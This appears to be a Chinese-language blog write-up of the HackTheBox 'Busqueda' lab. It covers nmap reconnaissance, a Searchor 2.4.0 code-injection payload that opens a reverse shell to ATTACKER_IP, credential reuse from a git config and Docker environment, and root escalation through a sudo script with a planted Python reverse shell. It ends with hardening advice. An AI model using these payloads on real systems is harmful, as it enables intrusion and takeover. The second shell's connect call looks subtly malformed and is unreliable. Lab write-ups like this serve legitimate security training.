# HacktheBox 打靶之旅：busqueda


### 👾 网络拓扑

TargetIP: 10.10.11.208

PrivateIP: 10.10.14.31

### 🏞️ 渗透环境搭建

Kali Linux In VM

### 🧐 开始渗透！

本期工具以及信息站点使用：nmap, chatGPT, Wappalyzer, hacktricks, docker Documentation, gtfobins

#### 🔎 前期信息收集

我们当前的信息只有一个目标机器的IP地址，我们考虑使用Nmap对目标机器进行一个端口扫描以及服务探测以进行前期的信息收集过程。

```bash
nmap -p- --open -sS -n -Pn -oN nmap/busqueda 10.10.11.208
```

-   `-p-`: 这个选项指示Nmap扫描所有的端口号，而不仅仅是默认的一些常见端口。
-   `--open`: 这个选项告诉Nmap只显示开放的端口，即响应连接请求的端口。
-   `-sS`: 这个选项指定使用TCP SYN扫描方式，也称为半开放扫描。它发送一个SYN包到目标主机的每个扫描的端口，如果收到SYN/ACK响应，则表示该端口是开放的。
-   `-n`: 这个选项告诉Nmap禁用主机名解析，只使用IP地址进行扫描。
-   `-Pn`: 这个选项指示Nmap不要进行主机发现，即不检查目标主机是否在线。

扫描报告如下所示，

```bash
Nmap scan report for 10.10.11.208
Host is up, received user-set (0.11s latency).
Scanned at 2023-07-15 00:42:15 UTC for 27s
Not shown: 56482 filtered ports, 9051 closed ports
Reason: 56482 no-responses and 9051 resets
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 128
80/tcp open  http    syn-ack ttl 128

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.96 seconds
           Raw packets sent: 131073 (5.767MB) | Rcvd: 16926 (677.048KB)
```

可以看到目标机器上开放了22,80端口，我们需要更进一步的探测其上运行服务的信息，使用如下nmap命令，

```bash
nmap -p22,80 -sC -sV 10.10.11.208
```

-   `-p22,80`: 这个选项指定了要扫描的端口号。在这个例子中，它指定了扫描22和80两个端口。
-   `-sC`: 这个选项启用了Nmap的默认脚本扫描。它会在扫描中应用一些常见的脚本来探测目标主机的漏洞或配置问题。
-   `-sV`: 这个选项启用了版本探测功能，它会尝试确定目标主机上运行的服务和应用程序的版本信息。

扫描报告如下所示，

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 00:47 UTC
Nmap scan report for 10.10.11.208
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds
```

在这一份报告中我们得到了开放端口上运行服务的版本信息,

-   22/tcp: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-   80/tcp: Apache httpd 2.4.52
    -   http-server-header: Apache/2.4.52 (Ubuntu)
    -   http-title: Did not follow redirect to <http://searcher.htb/>

将searcher.htb与 10.10.11.208(TargetIP) 的映射添加到 `/etc/hosts` 文件中，添加后的文件应该有如下一行

```text
10.10.11.208 searcher.htb
```

> `/etc/hosts`文件是一个在Unix和类Unix系统中常见的文本文件，它用于将主机名映射到IP地址。这个文件可以用来**在本地系统上设置静态的主机名解析，而不需要依赖DNS服务器**。

#### 🎋 一探究竟：访问目标站点

访问目标站点(<http://searcher.htb)看看它的葫芦里卖的是什么药🙂，>


{{< image src="https://image.p1nant0m.xyz/20250617224039347.png" caption="Target Website" src_s="https://image.p1nant0m.xyz/20250617224039347.png" src_l="https://image.p1nant0m.xyz/20250617224039347.png" >}}

简单体验了下这个站点的功能，其实现了一个类似于聚合搜索引擎，用户可以选择他们偏好的主流搜索引擎进行信息检索。

我们可以通过Wappalyzer简单了解一下该站点使用了什么Web框架进行构建，

{{< image width=2 height=2 src="https://image.p1nant0m.xyz/20250617224046187.png" caption="WebTech Information" src_s="https://image.p1nant0m.xyz/20250617224046187.png" src_l="https://image.p1nant0m.xyz/20250617224046187.png" >}}

在页面最后的站点版权信息中我们可以看到该站点所使用到的技术包括Flask框架以及Searchor 2.4.0

#### 🔫 攻击开始！

**第一阶段：获得普通用户权限**

Google Hacking时间，看看相关框架有没有已知的nday以及PoC可供我们利用。经过一番搜索后发现Searchor 2.40存在[RCE漏洞](https://github.com/jonnyzar/POC-Searchor-2.4.2 "RCE漏洞")！

{{< image src="https://image.p1nant0m.xyz/20250617224053728.png" caption="Searchor Exploit PoC" src_s="https://image.p1nant0m.xyz/20250617224053728.png" src_l="https://image.p1nant0m.xyz/20250617224053728.png" >}}

其中的payload如下所示，

```text
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

```

使用nc在本地监听8080端口等待受害机器回弹shell，

```bash
nc -lnvp 8080
```

-   `-l`: 这个选项告诉`nc`工具要监听（listen）连接，即等待其他主机连接到指定的端口。
-   `-n`: 这个选项禁用主机名解析，只使用IP地址进行通信。
-   `-v`: 这个选项启用详细输出模式，打印更多的调试信息。
-   `-p 8080`: 这个选项指定要监听的端口号，这里是8080。

（这里免去了使用burpsuite的必要，直接向输入框中键入payload即可），最终我们在控制服务器上获得了受害机器回弹的shell，用户是svc。我们在 `/home/svc` 目录下找到了user.txt，获得了我们在普通用户权限下的第一个FLAG！**Well Done！**

**第二阶段：获得root用户权限**

我们以svc用户身份在文件系统中闲逛，搜索潜在的敏感信息以为后续的提权工作搜集信息。一些敏感的目录、文件包括：目标站点运行的工作目录，`/etc/passwd`，`.git`，`.ssh`，数据库文件，日志文件等。

在 `/home/svc` 目录下我们发现了用户的 `.gitconfig` 文件，其中的内容如下所示，

```toml
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
[safe]
        directory = /var/www/app
```

继续跟踪相关的目录，在 `/var/www/app` 目录下我们发现了 `.git` 目录，

{{< image src="https://image.p1nant0m.xyz/20250617224101097.png" caption=".git directory" src_s="https://image.p1nant0m.xyz/20250617224101097.png" src_l="https://image.p1nant0m.xyz/20250617224101097.png" >}}

其中存在config文件，内容如下，

{{< image src="https://image.p1nant0m.xyz/20250617224105670.png" caption="git config" src_s="https://image.p1nant0m.xyz/20250617224105670.png" src_l="https://image.p1nant0m.xyz/20250617224105670.png" >}}

这其中包含了以下信息：

-   cody用户的身份认证信息
-   目标站点的子域名gitea.searcher.htb上运行着gitea服务

我们使用获得的身份认证信息通过ssh连入目标机器上进行后续的工作，

```bash
ssh cody@searcher.htb
```

将 gitea.searcher.htb 加入 `/etc/hosts` 文件，现在你可以看到文件中有这样一条记录

```bash
10.10.11.208 searcher.htb gitea.searcher.htb
```

按照Checklist中的项目进行可利用提权入口进行检查，

<https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist>

-   [x] Can you execute **any command with sudo**? Can you use it to READ, WRITE or EXECUTE anything as root? ([**GTFOBins**](https://gtfobins.github.io "GTFOBins"))

{{< image src="https://image.p1nant0m.xyz/20250617224111441.png" caption="Commands that can be executed by sudo" src_s="https://image.p1nant0m.xyz/20250617224111441.png" src_l="https://image.p1nant0m.xyz/20250617224111441.png" >}}

最终我们将目标锁定在 `/usr/bin/python3 /opt/scripts/system-checkup.py` 上，

进入 `/opt/scripts` 目录中，其中的文件属主都是root，我们能进行的操作不多，运行 `/usr/bin/python3 /opt/scripts/system-checkup.py *` ，在终端中有如下输出，

{{< image src="https://image.p1nant0m.xyz/20250617224115551.png" caption="execute the provided scripts" src_s="https://image.p1nant0m.xyz/20250617224115551.png" src_l="https://image.p1nant0m.xyz/20250617224115551.png" >}}

Ohh，原来gitea服务是通过容器的形式进行部署并暴露对外提供服务的。在这里还提供了docker-inspect命令，可以让我们看到容器启动时的相关配置信息，包括容器中的环境变量信息等。

<https://docs.docker.com/engine/reference/commandline/inspect/>

执行命令 `/usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} 960873171e2e` ，查看gitea容器启动配置参数，

{{< image src="https://image.p1nant0m.xyz/20250617224120621.png" caption="Inspect docker container started variables" src_s="https://image.p1nant0m.xyz/20250617224120621.png" src_l="https://image.p1nant0m.xyz/20250617224120621.png" >}}

在这里我们发现了一些敏感信息，**GITEA\_base\_PASSWD=yuiu1hoiu4i5ho1uh**,尝试使用这个密码登录root无果。突然想到我们还有一个gitea服务还没去看看上面有什么呢？我们可以使用cody的账户登入系统看看有没有什么值得利用的信息。

使用cody的账户在gitea中闲逛时我们发现与cody同属一个组织的还有administrator，正好试试我们拿到的密码，


{{< image src="https://image.p1nant0m.xyz/20250617224124837.png" caption="Administrator is in the org with cody user" src_s="https://image.p1nant0m.xyz/20250617224124837.png" src_l="https://image.p1nant0m.xyz/20250617224124837.png" >}}

Boom！我们可以使用上面获得到的密码(**yuiu1hoiu4i5ho1uh**)登入administrator的账户，在管理员账户下我们发现了在 `/opt/scripts` 的文件，在gitea上我们便可以查看代码的主要逻辑。


{{< image src="https://image.p1nant0m.xyz/20250617224129178.png" caption="scripts that owned by Administrator" src_s="https://image.p1nant0m.xyz/20250617224129178.png" src_l="https://image.p1nant0m.xyz/20250617224129178.png" >}}

在对代码进行审计后，我们发现full-chekcup Action中没有对传入的脚本文件路径进行限制，进而可以进行任意代码执行，


{{< image src="https://image.p1nant0m.xyz/20250617224136074.png" caption="fragile point of the script execute logic" src_s="https://image.p1nant0m.xyz/20250617224136074.png" src_l="https://image.p1nant0m.xyz/20250617224136074.png" >}}

找到一个可以写的目录（/home/svc）并在其中创建一个名为full-checkup.sh的文件，其中的内容如下（我们可以从[https://gtfobins.github.io/](https://gtfobins.github.io/ "https://gtfobins.github.io/")中获得相关的payload），最后其中的文件内容如下,

```bash
#!/usr/bin/python3
import sys,socket,os,pty;
s=socket.socket()
s.connect('PRIVATE_IP', 8080)
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
```

故技重施，我们在控制服务器上使用netcat监听8080端口接收回弹的Shell，最终获得以root用户运行的终端，

{{< image src="https://image.p1nant0m.xyz/20250617224142488.png" caption="Get shell under the root user" src_s="https://image.p1nant0m.xyz/20250617224142488.png" src_l="https://image.p1nant0m.xyz/20250617224142488.png" >}}

最终也是读取了root.txt中存储的FLAG！

{{< image src="https://image.p1nant0m.xyz/20250617224813765.gif" caption="Target Website" src_s="https://image.p1nant0m.xyz/20250617224813765.gif" src_l="https://image.p1nant0m.xyz/20250617224813765.gif" >}} 

### 📖 总结复盘

1. 我是如何获得该站点服务器上的普通用户权限的？

通过站点使用的具有漏洞的组件实现nday RCE漏洞利用。

2. 我是如何发现漏洞点的？

站点上暴露了所使用组件的版本信息，通过公开数据库可以查询到对应组件的对应版本时候存在相关的漏洞，实现打靶第一步。

3. 如何进行进一步提权的？

提权的方式可以千奇百怪、脑洞大开（但也可以遵循一定的[Checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist "Checklist")来确保自己的机器是安全的）但大多数时候都是因为人员的疏忽导致的。以本靶机为例，cody用户能够执行的sudo的操作仅有一条并且原意是让其在 `/opt/scripts` 的目录中执行，但其忽略了对文件路径进行相关的限制，致使攻击者能够在任意可以进行写操作的目录中构造恶意脚本，并成功以root身份执行，最终实现提权。

4. 如何进行安全加固?

-   避免使用不安全的组件或依赖，在系统上线前可以通过各种类型的扫描工具(SAST, DAST, IAST...)在业务上线前确保没有中、高危漏洞存在
-   生产环境中部署服务的环境尽可能的精简，除服务正常运行所需的文件以外不应该存在任何其它的文件数据，更不能将高权限用户的身份凭证直接存放于生产环境之中
-   口令不可重复使用，重复使用的口令意味着当该口令泄露时所有与此相关的服务都存在失陷的风险
-   对于运维管理所必须存在的普通账户来说，需要严格限制其能够使用sudo的场景，对相关的参数进行过滤限制，必要时限制其能够登入的网络地址。

